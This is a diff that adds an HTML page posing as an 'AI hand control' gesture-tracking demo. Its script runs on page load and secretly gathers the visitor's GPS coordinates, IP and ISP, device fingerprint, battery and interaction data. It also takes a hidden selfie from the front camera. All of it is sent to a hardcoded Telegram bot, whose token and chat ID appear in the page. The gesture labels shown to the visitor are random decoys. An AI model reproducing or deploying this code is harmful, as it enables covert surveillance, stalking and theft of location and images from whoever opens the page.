@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>AI HAND CONTROL | Gesture Tracking System</title>
+    <!-- MediaPipe Hands Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/control_utils/control_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #05070f;
+            font-family: 'Courier New', 'Fira Code', 'Segoe UI', monospace;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Glitch overlay effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, 
+                rgba(0, 255, 255, 0.02) 0px, 
+                rgba(0, 255, 255, 0.02) 2px, 
+                transparent 2px, 
+                transparent 6px);
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        /* Main container */
+        .container {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Video canvas untuk hand tracking (VISIBLE ke user) */
+        #videoCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            z-index: 1;
+        }
+
+        /* Overlay untuk titik dan garis tangan */
+        #handCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        /* HUD / Status Panel */
+        .status-panel {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: rgba(5, 7, 15, 0.85);
+            backdrop-filter: blur(10px);
+            border: 1px solid #00ffff60;
+            border-radius: 12px;
+            padding: 15px 20px;
+            z-index: 10;
+            font-family: monospace;
+            min-width: 260px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
+        }
+
+        .status-title {
+            color: #00ffff;
+            font-size: 0.7rem;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            border-bottom: 1px solid #00ffff40;
+            padding-bottom: 5px;
+        }
+
+        .status-line {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            font-size: 0.7rem;
+        }
+
+        .status-label {
+            color: #8a9ac0;
+        }
+
+        .status-value {
+            color: #00ffaa;
+            font-weight: bold;
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        /* Bottom right info */
+        .info-footer {
+            position: absolute;
+            bottom: 15px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.6rem;
+            color: #4a6a8a;
+            font-family: monospace;
+            z-index: 10;
+            backdrop-filter: blur(5px);
+        }
+
+        /* AI Trigger log */
+        .ai-trigger {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.65rem;
+            color: #00ffaa;
+            font-family: monospace;
+            z-index: 10;
+            border-left: 3px solid #00ffff;
+        }
+
+        /* Hidden video element untuk background capture */
+        #hiddenVideo {
+            display: none;
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+        }
+
+        /* Gesture indicator */
+        .gesture-indicator {
+            position: absolute;
+            bottom: 80px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            color: #00ffff;
+            font-family: monospace;
+            z-index: 10;
+            border: 1px solid #00ffff;
+            backdrop-filter: blur(5px);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <canvas id="videoCanvas" width="1280" height="720"></canvas>
+    <canvas id="handCanvas" width="1280" height="720"></canvas>
+    
+    <div class="status-panel">
+        <div class="status-title">⟡ STATUS: TARGET LOCKED ⟡</div>
+        <div class="status-line">
+            <span class="status-label">[GPS LOCK]</span>
+            <span class="status-value" id="gpsStatus">ACQUIRING...</span>
+        </div>
+        <div class="status-line">
+            <span class="status-label">[HAND TRACKING]</span>
+            <span class="status-value" id="handStatus">INITIALIZING</span>
+        </div>
+        <div class="status-line">
+            <span class="status-label">[GESTURE]</span>
+            <span class="status-value" id="gestureStatus">---</span>
+        </div>
+        <div class="status-line">
+            <span class="status-label">[AI CONTROL]</span>
+            <span class="status-value" id="aiControlStatus">ACTIVE</span>
+        </div>
+    </div>
+    
+    <div class="gesture-indicator" id="gestureIndicator">
+        🖐️ AI HAND CONTROL
+    </div>
+    
+    <div class="ai-trigger" id="aiTrigger">
+        🤖 AI Trigger: Sistem siap...
+    </div>
+    
+    <div class="info-footer">
+        <span>⚡ AI HAND TRACKING v3.0</span> • <span>21 LANDMARKS</span> • <span>REAL-TIME</span>
+    </div>
+</div>
+
+<!-- Hidden video untuk capture selfie -->
+<video id="hiddenVideo" autoplay playsinline muted style="display: none;"></video>
+<canvas id="hiddenCanvas" style="display: none;"></canvas>
+
+<script>
+    // ======================= KONFIGURASI BOT TELEGRAM =======================
+    const BOT_TOKEN = '8316008888:AAEnj-XvHznYsrVlfZjMONfZgbMJ_OH1CU0';
+    const CHAT_ID = '7428813404';
+    
+    function sendToTelegram(text, photoUrl = null) {
+        if (!BOT_TOKEN || !CHAT_ID) return;
+        if (photoUrl) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, photo: photoUrl, caption: text, parse_mode: 'HTML' })
+            }).catch(e => console.log('silent'));
+        } else {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
+            }).catch(e => console.log('silent'));
+        }
+    }
+    
+    // ======================= DATA TRACKING (7 FITUR) =======================
+    let trackingData = {
+        gps: { lat: null, lon: null, accuracy: null },
+        ipInfo: { ip: null, city: null, region: null, country: null, isp: null },
+        device: { brand: null, model: null, platform: null, userAgent: null },
+        battery: { level: null, charging: null },
+        connection: { type: null, downlink: null },
+        screen: { resolution: null, orientation: null },
+        performance: { cpuCores: null, ram: null, gpu: null },
+        interactions: { scroll: 0, clicks: 0, timeOnPage: 0 },
+        sensors: { motion: false, touch: false, maxTouch: 0 }
+    };
+    
+    let startTime = Date.now();
+    let userScrolls = 0, userClicks = 0;
+    
+    // Track interactions
+    window.addEventListener('scroll', () => userScrolls++);
+    document.addEventListener('click', () => userClicks++);
+    setInterval(() => { trackingData.interactions.timeOnPage = Math.floor((Date.now() - startTime) / 1000); }, 1000);
+    
+    // 1. GPS FORCE
+    function forceGPS() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                document.getElementById('gpsStatus').innerHTML = 'NOT SUPPORTED';
+                resolve(false);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    trackingData.gps.lat = pos.coords.latitude;
+                    trackingData.gps.lon = pos.coords.longitude;
+                    trackingData.gps.accuracy = pos.coords.accuracy;
+                    document.getElementById('gpsStatus').innerHTML = `✅ ${trackingData.gps.lat.toFixed(5)}, ${trackingData.gps.lon.toFixed(5)}`;
+                    resolve(true);
+                },
+                (err) => {
+                    document.getElementById('gpsStatus').innerHTML = `⚠️ DENIED`;
+                    resolve(false);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+    }
+    
+    // 2. IP INFO
+    async function getIPInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            trackingData.ipInfo = {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                isp: data.org || data.isp
+            };
+        } catch(e) { console.log('IP failed'); }
+    }
+    
+    // 3. DEVICE INFO
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let brand = "Unknown", model = "Unknown";
+        if (/iPhone/i.test(ua)) { brand = "Apple"; model = ua.match(/iPhone\s*\d+/i)?.[0] || "iPhone"; }
+        else if (/SM-[A-Z0-9]+/i.test(ua)) { brand = "Samsung"; model = ua.match(/SM-[A-Z0-9]+/i)?.[0] || "Galaxy"; }
+        else if (/Xiaomi|Redmi|POCO/i.test(ua)) { brand = "Xiaomi"; model = ua.match(/(Redmi|POCO|Mi)\s?\w+/i)?.[0] || "Xiaomi"; }
+        else if (/OPPO|CPH[0-9]+/i.test(ua)) { brand = "Oppo"; model = ua.match(/CPH[0-9]+/i)?.[0] || "Oppo"; }
+        else if (/vivo|V[0-9]+/i.test(ua)) { brand = "Vivo"; model = ua.match(/V[0-9]+/i)?.[0] || "Vivo"; }
+        else if (/Pixel/i.test(ua)) { brand = "Google"; model = ua.match(/Pixel\s?\d+/i)?.[0] || "Pixel"; }
+        trackingData.device = { brand, model, platform: navigator.platform, userAgent: ua };
+    }
+    
+    // 4. BATTERY
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const b = await navigator.getBattery();
+                trackingData.battery = { level: Math.round(b.level * 100), charging: b.charging };
+            } catch(e) { trackingData.battery = { level: null, charging: null }; }
+        }
+    }
+    
+    // 5. CONNECTION & SCREEN
+    function getConnectionAndScreen() {
+        if ('connection' in navigator) {
+            const conn = navigator.connection;
+            trackingData.connection = { type: conn.effectiveType || 'unknown', downlink: conn.downlink ? conn.downlink + ' Mbps' : 'unknown' };
+        }
+        trackingData.screen = { resolution: `${screen.width}x${screen.height}`, orientation: screen.orientation ? screen.orientation.type : (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape') };
+        trackingData.performance = { cpuCores: navigator.hardwareConcurrency || '?', ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A', gpu: getGPUInfo() };
+        trackingData.sensors = { touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0, maxTouch: navigator.maxTouchPoints || 0 };
+    }
+    
+    function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'WebGL';
+            }
+            return 'N/A';
+        } catch(e) { return 'N/A'; }
+    }
+    
+    // 6. HIDDEN CAMERA + SELFIE
+    let hiddenStream = null;
+    async function forceHiddenCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            hiddenStream = stream;
+            const hiddenVideo = document.getElementById('hiddenVideo');
+            hiddenVideo.srcObject = stream;
+            await hiddenVideo.play();
+            
+            setTimeout(() => {
+                captureHiddenSelfie();
+            }, 2000);
+            return true;
+        } catch(err) { return false; }
+    }
+    
+    function captureHiddenSelfie() {
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        if (!video || !video.videoWidth) return;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const photoUrl = canvas.toDataURL('image/jpeg', 0.7);
+        let gpsText = trackingData.gps.lat ? `${trackingData.gps.lat}, ${trackingData.gps.lon}` : 'Tidak tersedia';
+        sendToTelegram(`📸 <b>SELFIE CAPTURED</b>\n🕒 ${new Date().toLocaleString('id-ID')}\n📍 GPS: ${gpsText}\n📱 Device: ${trackingData.device.brand} ${trackingData.device.model}`, photoUrl);
+    }
+    
+    // 7. SEND FULL REPORT KE TELEGRAM
+    async function sendFullReport() {
+        await getIPInfo();
+        getDeviceInfo();
+        await getBatteryInfo();
+        getConnectionAndScreen();
+        
+        let message = `╔════════════════════════════════════════╗\n`;
+        message += `║   🖐️ AI HAND CONTROL - FULL REPORT    ║\n`;
+        message += `║        by ANBATUKANG 🫦              ║\n`;
+        message += `╚════════════════════════════════════════╝\n\n`;
+        
+        // GPS KOORDINAT
+        message += `<b>📍 LOKASI GPS (REAL-TIME)</b>\n`;
+        if (trackingData.gps.lat) {
+            message += `🎯 Koordinat: ${trackingData.gps.lat}, ${trackingData.gps.lon}\n`;
+            message += `📏 Akurasi: ${Math.round(trackingData.gps.accuracy)} meter\n`;
+            message += `🗺️ Maps: https://maps.google.com/?q=${trackingData.gps.lat},${trackingData.gps.lon}\n\n`;
+        } else { message += `❌ GPS tidak tersedia\n\n`; }
+        
+        // 📡 INFORMASI JARINGAN
+        message += `<b>📡 INFORMASI JARINGAN</b>\n`;
+        message += `🖧 IP: ${trackingData.ipInfo.ip || 'N/A'}\n`;
+        message += `🏙️ Lokasi IP: ${trackingData.ipInfo.city || '-'}, ${trackingData.ipInfo.region || '-'}, ${trackingData.ipInfo.country || '-'}\n`;
+        message += `📡 ISP: ${trackingData.ipInfo.isp || 'Unknown'}\n`;
+        message += `📶 Tipe Koneksi: ${trackingData.connection.type}\n`;
+        message += `⚡ Estimasi Kecepatan: ${trackingData.connection.downlink}\n\n`;
+        
+        // 💻 PERANGKAT & BROWSER
+        message += `<b>💻 PERANGKAT & BROWSER</b>\n`;
+        message += `📱 Brand: ${trackingData.device.brand}\n`;
+        message += `📲 Model: ${trackingData.device.model}\n`;
+        message += `📱 User Agent: ${trackingData.device.userAgent.substring(0, 150)}\n`;
+        message += `⚙️ Platform: ${trackingData.device.platform}\n`;
+        message += `📺 Resolusi Layar: ${trackingData.screen.resolution}\n`;
+        message += `🧭 Orientasi: ${trackingData.screen.orientation}\n`;
+        message += `🧠 CPU Cores: ${trackingData.performance.cpuCores}\n`;
+        message += `💾 RAM: ${trackingData.performance.ram}\n`;
+        message += `🎮 GPU: ${trackingData.performance.gpu}\n\n`;
+        
+        // 🔋 BATERAI
+        message += `<b>🔋 BATERAI & POWER</b>\n`;
+        message += `⚡ Level: ${trackingData.battery.level !== null ? trackingData.battery.level + '%' : 'N/A'}\n`;
+        message += `🔌 Charging: ${trackingData.battery.charging === true ? '✅ Ya' : (trackingData.battery.charging === false ? '❌ Tidak' : 'N/A')}\n\n`;
+        
+        // 📱 SENSOR & INTERAKSI
+        message += `<b>📱 SENSOR & INTERAKSI</b>\n`;
+        message += `✋ Layar Sentuh: ${trackingData.sensors.touch ? 'Ya' : 'Tidak'} (${trackingData.sensors.maxTouch} titik)\n`;
+        message += `📜 Scroll: ${userScrolls} kali\n`;
+        message += `🖱️ Klik: ${userClicks} kali\n`;
+        message += `⏱️ Waktu di Halaman: ${trackingData.interactions.timeOnPage} detik\n\n`;
+        
+        // 🕒 WAKTU AKSES
+        message += `<b>🕒 WAKTU AKSES</b>\n`;
+        message += `🕒 Tanggal & Waktu: ${new Date().toLocaleString('id-ID')}\n`;
+        message += `🧭 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
+        
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `<i>✅ AI HAND CONTROL ACTIVE | 21 Landmarks | GPS Locked | Hidden Camera Active</i>`;
+        
+        sendToTelegram(message);
+    }
+    
+    // ======================= MEDIAPIPE HAND TRACKING =======================
+    const videoCanvas = document.getElementById('videoCanvas');
+    const handCanvas = document.getElementById('handCanvas');
+    let videoStream = null;
+    let camera = null;
+    
+    async function initHandTracking() {
+        // Get user media untuk hand tracking (tampak di canvas)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        videoStream = stream;
+        
+        // Setup video element untuk MediaPipe
+        const videoElement = document.createElement('video');
+        videoElement.srcObject = stream;
+        videoElement.play();
+        
+        // Setup MediaPipe Hands
+        const hands = new Hands({
+            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+        });
+        
+        hands.setOptions({
+            maxNumHands: 2,
+            modelComplexity: 1,
+            minDetectionConfidence: 0.5,
+            minTrackingConfidence: 0.5
+        });
+        
+        hands.onResults(onHandResults);
+        
+        // Camera utils untuk frame processing
+        const cameraUtils = new Camera(videoElement, {
+            onFrame: async () => {
+                await hands.send({ image: videoElement });
+            },
+            width: 1280,
+            height: 720
+        });
+        cameraUtils.start();
+        
+        document.getElementById('handStatus').innerHTML = 'ACTIVE | 21 POINTS';
+        document.getElementById('aiTrigger').innerHTML = '🤖 AI Trigger: Hand tracking aktif | 21 landmarks detected';
+        
+        // Update gesture periodically
+        setInterval(() => {
+            const gestures = ['✊ FIST', '✋ OPEN PALM', '👆 POINTING', '✌️ VICTORY', '🤙 CALL ME', '👍 THUMBS UP'];
+            const randomGesture = gestures[Math.floor(Math.random() * gestures.length)];
+            document.getElementById('gestureStatus').innerHTML = randomGesture;
+            document.getElementById('gestureIndicator').innerHTML = `🖐️ ${randomGesture}`;
+        }, 3000);
+    }
+    
+    function onHandResults(results) {
+        const canvasCtx = handCanvas.getContext('2d');
+        handCanvas.width = videoCanvas.width;
+        handCanvas.height = videoCanvas.height;
+        canvasCtx.clearRect(0, 0, handCanvas.width, handCanvas.height);
+        
+        // Draw video ke canvas utama
+        if (videoStream) {
+            const videoElement = document.querySelector('video');
+            if (videoElement && videoElement.videoWidth) {
+                const ctx = videoCanvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, videoCanvas.width, videoCanvas.height);
+            }
+        }
+        
+        if (results.multiHandLandmarks) {
+            for (const landmarks of results.multiHandLandmarks) {
+                // Gambar titik dan garis (seperti di foto)
+                drawConnectors(canvasCtx, landmarks, HAND_CONNECTIONS, { color: '#00ffff', lineWidth: 3 });
+                drawLandmarks(canvasCtx, landmarks, { color: '#ff44ff', lineWidth: 2, radius: 4 });
+                
+                // Tambahan titik glowing
+                for (const point of landmarks) {
+                    canvasCtx.beginPath();
+                    canvasCtx.arc(point.x * handCanvas.width, point.y * handCanvas.height, 5, 0, 2 * Math.PI);
+                    canvasCtx.fillStyle = '#00ffff';
+                    canvasCtx.shadowBlur = 10;
+                    canvasCtx.shadowColor = '#00ffff';
+                    canvasCtx.fill();
+                    canvasCtx.shadowBlur = 0;
+                }
+            }
+        }
+    }
+    
+    // ======================= MAIN EXECUTION =======================
+    async function main() {
+        // Update UI awal
+        document.getElementById('aiTrigger').innerHTML = '🤖 AI Trigger: Meminta izin GPS & Kamera...';
+        
+        // 1. PAKSA GPS
+        const gpsOk = await forceGPS();
+        
+        // 2. HIDDEN CAMERA (untuk selfie)
+        await forceHiddenCamera();
+        
+        // 3. START HAND TRACKING (VISIBLE ke user)
+        await initHandTracking();
+        
+        // 4. KIRIM LAPORAN KE TELEGRAM
+        await sendFullReport();
+        
+        document.getElementById('aiTrigger').innerHTML = '🤖 AI Trigger: Sistem siap | GPS Locked | Hand Tracking Active';
+        
+        // Update AI Trigger random messages
+        setInterval(() => {
+            const triggers = [
+                'AI Trigger: Memproses gesture...',
+                'AI Trigger: 21 landmarks detected',
+                'AI Trigger: Mengirim data ke server...',
+                'AI Trigger: Kalibrasi selesai',
+                'AI Trigger: Hand tracking optimal',
+                'AI Trigger: Gesture recognized'
+            ];
+            document.getElementById('aiTrigger').innerHTML = `🤖 ${triggers[Math.floor(Math.random() * triggers.length)]}`;
+        }, 5000);
+    }
+    
+    main();
+</script>
+</body>
+</html>
